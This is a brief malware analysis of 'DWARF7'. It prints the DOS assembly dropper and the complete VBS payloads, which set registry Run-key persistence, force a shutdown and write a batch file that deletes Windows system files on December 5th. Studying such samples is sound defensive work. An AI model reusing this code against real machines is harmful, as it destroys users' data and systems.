
**Analysis of DWARF7 Malware**

### Introduction

DWARF7 is a DOS assembly malware that runs on Windows and operates in two phases. It creates two VBS (Visual Basic Script) files: **Dwarf.vbs** and **Panda.vbs**. Its purpose is to schedule the execution of a malicious script on December 5th, which modifies the system and attempts to delete critical files.

### Code Breakdown

The malware follows these steps:

#### 1. Creating Malicious Files

The program first creates two files on the disk:

-   **Dwarf.vbs** in `C:\`
-   **Panda.vbs** in `C:\WINDOWS\`

This is done using DOS interrupt `int 21h`, with the following services:

-   `3Ch` to create a file
-   `40h` to write to the file
-   `3Eh` to close the file

```assembly
FILE1:  mov ah,3Ch  ; Create file
        xor cx,cx
        mov dx,offset NOM1  ; C:\Dwarf.vbs
        int 21h  
        xchg ax,bx
        mov ah,40h  ; Write
        mov cx,progl1
        mov dx,offset prog1
        int 21h
        mov ah,3Eh  ; Close
        int 21h
```

#### 2. Content of Dwarf.vbs

The **Dwarf.vbs** file contains Visual Basic Script code that displays a message and registers **Panda.vbs** in the Windows registry to execute it at every startup.

```vbs
msgbox "BONNE JOURNÉE ?",vbexclamation
Dim W
Set W = Wscript.CreateObject("WScript.Shell")
W.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\Panda.vbs"
```

#### 3. Delayed Execution of Panda.vbs

The **Panda.vbs** file is designed to activate only on **December 5th**. This script:

-   Displays a fake error message
    
-   Adds a registry key to shut down the computer on the next startup
    
-   Creates a `C:\autoexe.bat` file that deletes system files upon reboot

```vbs
If Day(Now) = 5 And Month(Now) = 12 Then
    msgbox "ERREUR : CLIQUEZ SUR OK",vbcritical
    Dim W
    Set W=CreateObject("WScript.Shell")
    W.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\RUNDLL32.EXE %windir%\system\user.exe,Exitwindows"
    W.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DwArF2", "C:\autoexe.bat"
    Set X=CreateObject("Scripting.FileSystemObject")
    file="C:\autoexe.bat"
    Set O=X.CreateTextFile(file, True, False)
    O.Writeline "@echo off"
    O.Writeline "del C:\WINDOWS\*.ini"
    O.Writeline "del C:\WINDOWS\*.sys"
    O.Writeline "del C:\WINDOWS\*.bmp"
    O.Writeline "del C:\WINDOWS\COMMAND\*.*"
    O.Writeline "del C:\WINDOWS\SYSTEM\*.dll"
    msgbox "YOU WILL DIE TOMORROW",vbinformation
End If
```

### Malware Impact

1.  **Automatic Execution**: By adding `Panda.vbs` to the registry, it ensures it runs at every startup.
    
2.  **File Deletion**: Deleting essential Windows files can render the computer inoperable.
    
3.  **Psychological Threat**: The displayed messages aim to intimidate the user.
    
4.  **System Shutdown**: The registry key forcing Windows shutdown makes the computer unusable after the attack.
    

### Conclusion

DWARF7 is a simple but effective malware that exploits VBS and the Windows registry to propagate and destroy files. While it was designed in 2000, similar techniques can still be encountered today. Increased vigilance and the use of antivirus software are essential to prevent such threats.
